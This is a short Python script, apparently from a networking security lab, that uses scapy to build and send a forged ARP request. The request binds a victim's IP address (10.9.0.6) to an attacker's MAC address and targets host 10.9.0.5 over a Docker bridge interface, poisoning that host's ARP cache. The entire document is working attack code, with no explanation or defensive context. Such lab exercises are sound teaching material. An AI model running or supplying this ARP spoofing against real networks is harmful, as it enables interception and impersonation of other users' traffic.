# lebron

#!/usr/bin/env python3
from scapy.all import *

# Define Ethernet frame
eth_frame = Ether(dst="02:42:0a:09:00:05")

# Define ARP packet
arp_request = ARP(
    op=1,
    psrc="10.9.0.6",               # Victim B's IP address
    hwsrc="02:42:0a:09:00:69",     # Attacker's MAC address
    pdst="10.9.0.5",               # Target A's IP address
    hwdst="02:42:0a:09:00:05"      # Target A's MAC address
)

# Combine the Ethernet frame with the ARP packet
packet = eth_frame / arp_request

# Send the packet on a specific network interface
sendp(packet, iface="br-33d7cd2e3f46")
